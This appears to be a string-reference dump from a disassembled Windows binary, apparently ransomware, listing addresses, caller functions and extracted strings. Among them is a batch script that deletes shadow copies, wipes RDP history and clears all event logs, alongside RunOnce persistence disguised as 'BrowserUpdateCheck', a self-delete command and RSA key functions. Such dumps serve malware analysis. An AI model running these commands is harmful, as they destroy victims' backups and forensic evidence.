reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4023bf	0x40975d	string	0x402354	UVW3
0x402455	0x401654	string	0x402354	taskkill /F /T /PID
0x40389c	0x403940	string	0x40386e	+:;>\e
0x4038e4	0x403940	string	0x40386e	+:;>\e
0x403909	0x403940	string	0x40386e	+:;>\e
0x403929	0x403940	string	0x40386e	+:;>\e
0x403b05	0x403b3c	string	0x4039c6	][_^Y
0x403bcc	0x403c1c	string	0x403b7d	][_^Y
0x403beb	0x403c1c	string	0x403b7d	][_^Y
0x403c05	0x403c1c	string	0x403b7d	][_^Y
0x403d80	0x403db6	string	0x403d4d	^][_
0x4040fb	0x40412f	string	0x4040ba	^_][Y
0x40437d	0x4044ba	string	0x404336	X_][
0x404502	0x404543	string	0x4044c4	_^][
0x404511	0x404543	string	0x4044c4	_^][
0x404515	0x404543	string	0x4044c4	_^][
0x4045ee	0x404667	string	0x4045a5	_^][Y
0x40470c	0x404715	string	0x40466f	_^[Y
0x404965	0x40497a	string	0x404939	;]\ft
0x404ccf	0x404ce5	string	0x404c6a	9|$\t
0x404d01	0x40509b	string	0x404c6a	^[_]
0x40609e	0x4060b5	string	0x406065	^]_[
0x406a62	0x406a6c	string	0x406a4e	UVWh
0x406b5b	0x406b25	string	0x406a4e	3ҍL$ blocks=Basic Latin,Cyrillic
0x406b75	0x406b0b	string	0x406a4e	3\r|$
0x406d4a	0x406d64	string	0x406cbf	j\bY3\r|$
0x406f36	0x406f42	string	0x406eec	^_[]
0x406f5c	0x401934	string	0x406eec	SHA224
0x406f7c	0x40193c	string	0x406eec	SHA256
0x40744a	0x401c44	string	0x407381	%d.%d
0x4074d1	0x4074c2	string	0x407381	]_^[
0x40817c	0x4081d4	string	0x4080cb	[_^]
0x4081bd	0x4081d4	string	0x4080cb	[_^]
0x4081cd	0x4081d4	string	0x4080cb	[_^]
0x408470	0x4084d0	string	0x40838e	9\$,u\rUUW
0x4084de	0x40859d	string	0x40838e	^]_[
0x408513	0x40859d	string	0x40838e	^]_[
0x408596	0x40859d	string	0x40838e	^]_[
0x40864c	0x4087fb	string	0x4085dc	^_][
0x4086d6	0x4087fb	string	0x4085dc	^_][
0x4087db	0x4087fb	string	0x4085dc	^_][
0x4087ed	0x4087fb	string	0x4085dc	^_][
0x4087f4	0x4087fb	string	0x4085dc	^_][
0x408a17	0x408ac8	string	0x4089f5	_^][
0x408a2a	0x408ac8	string	0x4089f5	_^][
0x408a40	0x408ac8	string	0x4089f5	_^][
0x408a4e	0x408ac8	string	0x4089f5	_^][
0x408a73	0x408ac8	string	0x4089f5	_^][
0x408a88	0x408ac8	string	0x4089f5	_^][
0x408aaf	0x408ac8	string	0x4089f5	_^][
0x408ac1	0x408ac8	string	0x4089f5	_^][
0x409061	0x401d98	string	0x409029	{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}
0x4090e4	0x40975d	string	0x409081	UVW3
0x4096f5	0x4021d0	string	0x4096cb	.bat
0x40972e	0x402008	string	0x4096cb	@echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
0x4097f2	0x4021dc	string	0x40979f	COMSPEC
0x409811	0x4021ec	string	0x40979f	/c del
0x409829	0x4021fc	string	0x40979f	> nul
0x40985a	0x40220c	string	0x40979f	Open
0x409981	0x40a774	string	0x4098d0	VWj\b
0x409a42	0x40975d	string	0x4098d0	UVW3
0x409a7c	0x40a774	string	0x4098d0	VWj\b
0x409b6e	0x4099fa	string	0x4098d0	h "@
0x409d32	0x409d1e	string	0x409cb8	h0"@
0x409d5d	0x402238	string	0x409d43	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x409d89	0x40229c	string	0x409d43	BrowserUpdateCheck
0x409fa4	0x4022c4	string	0x409f1b	temp
0x409fe7	0x409cb8	string	0x409f1b	SUVW
0x409ffd	0x409cb8	string	0x409f1b	SUVW
0x40a011	0x4022d0	string	0x409f1b	appdata
0x40a09d	0x4022e0	string	0x409f1b	public
0x40a0aa	0x4022f0	string	0x409f1b	ALLUSERSPROFILE
0x40a11a	0x409e0a	string	0x409f1b	QQSW3
0x40a171	0x402310	string	0x409f1b	{{IDENTIFIER}}
0x40a44d	0x402328	string	0x40a3f4	rsa_encrypt
0x40a571	0x402334	string	0x40a534	rsa_genkey
0x40a762	0x40267e	string	0x40a534	SUVW
